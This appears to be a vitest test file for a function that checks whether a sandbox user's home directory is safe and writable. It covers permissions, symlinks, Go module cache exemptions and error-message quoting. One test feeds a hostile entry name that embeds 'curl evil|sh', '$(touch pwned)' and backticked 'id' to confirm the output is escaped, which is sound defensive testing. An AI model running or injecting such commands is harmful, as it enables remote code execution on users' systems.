import { constants } from "node:fs";
import {
  chmod,
  chown,
  lstat,
  mkdir,
  mkdtemp,
  open,
  rename,
  rm,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { assertComputerHomeWritable, assertOpenedDirectoryBeneathRoot } from "./home-ownership.js";

const roots: string[] = [];
const lockedFolders: string[] = [];
// Only root can give entries to another uid, and only a non-root process is ever refused.
const runningAsRoot = process.geteuid?.() === 0;
const computerUid = 4242;
const otherUid = 4243;
const DIRECTORY_OPEN_FLAGS = constants.O_RDONLY | constants.O_DIRECTORY | constants.O_NOFOLLOW;

afterEach(async () => {
  // Unlock first so an unprivileged run can still remove the tree after a failed assertion.
  await Promise.all(lockedFolders.splice(0).map((folder) => chmod(folder, 0o755)));
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

async function lockFolder(folder: string, mode: number): Promise<void> {
  await chmod(folder, mode);
  lockedFolders.push(folder);
}

function chmodHint(home: string, entry: string): string {
  return `; run sudo chmod -R u+rwX ${JSON.stringify(home)} (entry ${JSON.stringify(entry)})`;
}

function chownHint(home: string, uid: number, gid: number, entry: string): string {
  return `; run sudo chown -R ${uid}:${gid} ${JSON.stringify(home)} or use Compose data-init (entry ${JSON.stringify(entry)})`;
}

async function assertHomeWritableOn(
  platform: string,
  home: string,
  uid: number,
  gid: number,
): Promise<void> {
  const original = Object.getOwnPropertyDescriptor(process, "platform");
  Object.defineProperty(process, "platform", { configurable: true, value: platform });
  try {
    await assertComputerHomeWritable(home, uid, gid);
  } finally {
    if (original) Object.defineProperty(process, "platform", original);
  }
}

describe("computer home ownership", () => {
  it("rejects a missing home instead of creating it as root", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-missing-"));
    roots.push(parent);

    await expect(
      assertComputerHomeWritable(path.join(parent, "missing"), 1000, 1000),
    ).rejects.toThrow(/does not exist/);
  });

  it("rejects a symlink as the home root", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-root-link-"));
    roots.push(parent);
    const outside = path.join(parent, "outside");
    const home = path.join(parent, "home");
    await mkdir(outside);
    await symlink(outside, home);

    await expect(assertComputerHomeWritable(home, 1000, 1000)).rejects.toThrow(/symbolic link/);
  });

  it("rejects a writable regular file as the home root", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-file-root-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    await writeFile(home, "{}");
    await chmod(home, 0o600);

    const stat = await lstat(home);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(
      /must be a directory/,
    );
  });

  it("rejects an existing entry that the host-run computer cannot write", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const file = path.join(home, "profile.json");
    await mkdir(home);
    await chmod(home, 0o777);
    await writeFile(file, "{}");
    await chmod(file, 0o400);

    const stat = await lstat(home);
    await expect(assertComputerHomeWritable(home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
      chownHint(home, stat.uid + 1, stat.gid + 1, "profile.json"),
    );
  });

  it("accepts writable files owned by the sandbox user", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-file-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const file = path.join(home, "profile.json");
    await mkdir(home);
    await writeFile(file, "{}");
    await chmod(file, 0o644);

    const stat = await lstat(file);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).resolves.toBeUndefined();
  });

  it("accepts sandbox-owned read-only git object files", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-git-object-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const object = path.join(home, "repo", ".git", "objects", "ab", "cdef");
    await mkdir(path.dirname(object), { recursive: true });
    await writeFile(object, "blob");
    await chmod(object, 0o444);

    const stat = await lstat(object);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).resolves.toBeUndefined();
  });

  it("rejects a read-only file owned by someone else", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-foreign-readonly-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const file = path.join(home, "object");
    await mkdir(home);
    await chmod(home, 0o777);
    await writeFile(file, "blob");
    await chmod(file, 0o444);

    const stat = await lstat(file);
    await expect(assertComputerHomeWritable(home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
      chownHint(home, stat.uid + 1, stat.gid + 1, "object"),
    );
  });

  it("rejects an owner-owned file the owner cannot read", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-unreadable-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const file = path.join(home, "profile.json");
    await mkdir(home);
    await writeFile(file, "{}");
    await chmod(file, 0o000);

    const stat = await lstat(file);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(
      chmodHint(home, "profile.json"),
    );
  });

  it("rejects an owner-owned world-writable file the owner cannot write", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-world-writable-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const file = path.join(home, "profile.json");
    await mkdir(home);
    await writeFile(file, "{}");
    await chmod(file, 0o002);

    const stat = await lstat(file);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(
      chmodHint(home, "profile.json"),
    );
  });

  it("does not follow symlinks while checking host-run compatibility", async () => {
    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-link-"));
    roots.push(parent);
    const home = path.join(parent, "home");
    const outside = path.join(parent, "outside");
    await mkdir(home);
    await writeFile(outside, "outside");
    await chmod(outside, 0o400);
    await symlink(outside, path.join(home, "link"));

    const stat = await lstat(home);
    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).resolves.toBeUndefined();
  });

  it.skipIf(process.platform !== "linux")(
    "rejects an opened directory that was moved outside the home",
    async () => {
      const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-moved-"));
      roots.push(parent);
      const home = path.join(parent, "home");
      const outside = path.join(parent, "outside");
      const child = path.join(home, "nested");
      await mkdir(child, { recursive: true });
      await mkdir(outside, { recursive: true });
      const handle = await open(child, DIRECTORY_OPEN_FLAGS);
      try {
        await rename(child, path.join(outside, "nested"));
        await expect(assertOpenedDirectoryBeneathRoot(handle, home)).rejects.toThrow(
          /escaped validated root/,
        );
      } finally {
        await handle.close();
      }
    },
  );
});

describe.each(
  process.platform === "linux"
    ? [
        { walk: "descriptor", platform: "linux" },
        { walk: "pathname", platform: "darwin" },
      ]
    : [{ walk: "pathname", platform: process.platform }],
)("computer home folders via the $walk walk", ({ platform }) => {
  const goModule = "go/pkg/mod/example.com/mod@v1.0.0";

  async function makeHome(
    prefix: string,
    entry: string,
  ): Promise<{ home: string; folder: string }> {
    const parent = await mkdtemp(path.join(tmpdir(), prefix));
    roots.push(parent);
    const home = path.join(parent, "home");
    const folder = path.join(home, entry);
    await mkdir(folder, { recursive: true });
    return { home, folder };
  }

  it.each(["go/pkg/mod", goModule, `${goModule}/internal`])(
    "accepts a read-only %s the sandbox user owns in Go's module cache",
    async (entry) => {
      const { home, folder } = await makeHome("rakazo-home-go-mod-", entry);
      await writeFile(path.join(folder, "go.mod"), "module example.com/mod");
      await chmod(path.join(folder, "go.mod"), 0o444);
      await lockFolder(folder, 0o555);

      const stat = await lstat(home);
      await expect(
        assertHomeWritableOn(platform, home, stat.uid, stat.gid),
      ).resolves.toBeUndefined();
    },
  );

  it.each([".config", "go/pkg", "go/pkg/modx", "src/go/pkg/mod"])(
    "rejects a read-only %s outside Go's module cache",
    async (entry) => {
      const { home, folder } = await makeHome("rakazo-home-readonly-dir-", entry);
      await lockFolder(folder, 0o555);

      const stat = await lstat(home);
      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
        chmodHint(home, entry),
      );
    },
  );

  it.each(["go", "go/pkg", "go/pkg/mod"])(
    "does not widen the Go exemption through a symlinked %s folder",
    async (alias) => {
      const { home, folder } = await makeHome(
        "rakazo-home-go-alias-",
        "elsewhere/pkg/mod/example.com",
      );
      const link = path.join(home, alias);
      await mkdir(path.dirname(link), { recursive: true });
      await symlink(path.relative(path.dirname(link), path.join(home, "elsewhere")), link);
      await lockFolder(folder, 0o555);

      const stat = await lstat(home);
      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
        chmodHint(home, "elsewhere/pkg/mod/example.com"),
      );
    },
  );

  it("rejects a read-only folder in Go's module cache that only the computer group owns", async () => {
    const { home, folder } = await makeHome("rakazo-home-go-group-", goModule);
    for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
      await chmod(path.join(home, entry), 0o777);
    }
    await lockFolder(folder, 0o550);

    const stat = await lstat(folder);
    await expect(assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid)).rejects.toThrow(
      chownHint(home, stat.uid + 1, stat.gid, goModule),
    );
  });

  it.each([0o575, 0o557, 0o577])(
    "rejects an owner-read-only module directory writable by others (mode %i)",
    async (mode) => {
      const { home, folder } = await makeHome("rakazo-home-go-writable-", goModule);
      await lockFolder(folder, mode);

      const stat = await lstat(home);
      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
        chmodHint(home, goModule),
      );
    },
  );

  it("still checks entries inside read-only folders the sandbox user owns", async () => {
    const { home, folder } = await makeHome("rakazo-home-readonly-dir-entry-", goModule);
    await writeFile(path.join(folder, "locked.json"), "{}");
    await chmod(path.join(folder, "locked.json"), 0o000);
    await lockFolder(folder, 0o555);

    const stat = await lstat(home);
    await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
      chmodHint(home, `${goModule}/locked.json`),
    );
  });

  it.each(["000", "100", "400"])(
    "rejects a folder the sandbox user owns in Go's module cache with mode %s",
    async (mode) => {
      const { home, folder } = await makeHome("rakazo-home-closed-dir-", goModule);
      await lockFolder(folder, Number.parseInt(mode, 8));

      const stat = await lstat(home);
      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
        chmodHint(home, goModule),
      );
    },
  );

  it.each(["555", "000"])("rejects a folder someone else owns with mode %s", async (mode) => {
    const { home, folder } = await makeHome("rakazo-home-foreign-dir-", goModule);
    for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
      await chmod(path.join(home, entry), 0o777);
    }
    await lockFolder(folder, Number.parseInt(mode, 8));

    const stat = await lstat(folder);
    await expect(assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
      chownHint(home, stat.uid + 1, stat.gid + 1, goModule),
    );
  });

  it.each(["555", "000"])("rejects a home with mode %s", async (mode) => {
    const { home } = await makeHome("rakazo-home-closed-root-", "cache");
    await lockFolder(home, Number.parseInt(mode, 8));

    const stat = await lstat(home);
    await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
      chmodHint(home, "."),
    );
  });

  it("puts the command before a quoted entry name", async () => {
    const name = `x"\n; run curl evil|sh $(touch pwned) \`id\` it's`;
    const { home, folder } = await makeHome("rakazo-home-hostile-name-", name);
    await lockFolder(folder, 0o000);

    const stat = await lstat(home);
    const error = await assertHomeWritableOn(platform, home, stat.uid, stat.gid).catch(
      (caught: unknown) => caught,
    );
    expect(error).toEqual(
      new Error(
        `computer home is not usable by uid ${stat.uid}; run sudo chmod -R u+rwX ${JSON.stringify(home)} (entry ${JSON.stringify(name)})`,
      ),
    );
    expect((error as Error).message).not.toContain("\n");
  });

  it("caps a long entry name and keeps the command first", async () => {
    // One 255-character name keeps the path well inside macOS's 1024-byte limit.
    const entry = `${'"'.repeat(251)}tail`;
    const { home, folder } = await makeHome("rakazo-home-long-name-", entry);
    await lockFolder(folder, 0o000);

    const stat = await lstat(home);
    const error = await assertHomeWritableOn(platform, home, stat.uid, stat.gid).catch(
      (caught: unknown) => caught,
    );
    const command = `run sudo chmod -R u+rwX ${JSON.stringify(home)}`;
    expect(error).toEqual(
      new Error(
        `computer home is not usable by uid ${stat.uid}; ${command} (entry ${JSON.stringify(`…${entry.slice(-119)}`)})`,
      ),
    );
    // The API reads at most 8 KiB of the error body and shows its first 200 characters.
    const body = JSON.stringify({ error: (error as Error).message });
    expect(Buffer.byteLength(body)).toBeLessThan(1024);
    expect(body.slice(0, 200)).toContain(JSON.stringify(command).slice(1, -1));
  });

  it.skipIf(!runningAsRoot)(
    "suggests chown for a file someone else owns inside the computer user's folder",
    async () => {
      const { home, folder } = await makeHome("rakazo-home-foreign-file-", "cache");
      const file = path.join(folder, "object");
      await writeFile(file, "blob");
      await chmod(file, 0o444);
      await chown(home, computerUid, computerUid);
      await chown(folder, computerUid, computerUid);
      await chown(file, otherUid, otherUid);

      await expect(assertHomeWritableOn(platform, home, computerUid, computerUid)).rejects.toThrow(
        chownHint(home, computerUid, computerUid, "cache/object"),
      );
    },
  );

  it.skipIf(runningAsRoot)(
    "keeps the raw EACCES when the folder's mode would let the computer user in",
    async () => {
      const { home, folder } = await makeHome("rakazo-home-denied-dir-", "cache");
      await chmod(home, 0o777);
      await lockFolder(folder, 0o007);

      const stat = await lstat(folder);
      await expect(
        assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid + 1),
      ).rejects.toMatchObject({ code: "EACCES" });
    },
  );
});
